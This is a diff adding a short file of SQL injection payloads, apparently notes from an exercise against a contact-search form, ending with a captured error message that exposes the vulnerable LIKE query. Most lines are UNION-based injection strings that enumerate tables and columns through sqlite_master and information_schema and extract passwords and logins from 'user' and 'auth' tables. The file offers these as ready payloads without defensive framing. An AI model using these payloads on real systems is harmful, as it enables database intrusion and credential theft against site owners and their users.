@@ -1,0 +1,16 @@
+SELECT name FROM my_db.sqlite_master WHERE type='table';
+
+asdf%" UNION SELECT name FROM sqlite_master WHERE type='table' OR type LIKE "%adf
+
+asdf%" UNION SELECT name FROM sql_injection.sqlite_master WHERE type='table'; OR type LIKE "%adf
+
+a%" UNION SELECT table_name,0,0,0 FROM information_schema.tables UNION SELECT id, name, email, address FROM contact WHERE name LIKE "%adf
+
+ý%" UNION SELECT password,0,0,0 FROM user UNION SELECT id, name, email, address FROM contact WHERE name LIKE "%á
+
+ý%" UNION SELECT table_schema, table_name, column_name, 0 FROM information_schema.columns UNION SELECT id, name, email, address FROM contact WHERE name LIKE "%á
+
+ý%" UNION SELECT id, passwd, login, 0 FROM auth UNION SELECT id, name, email, address FROM contact WHERE name LIKE "%á
+
+
+Error: Table 'sql_injection.sqlite_master' doesn't exist Check for errors in your query: SELECT id, name, email, address FROM contact WHERE name LIKE "%asdf%" UNION SELECT name FROM sqlite_master WHERE type='table' OR type LIKE "%adf%"
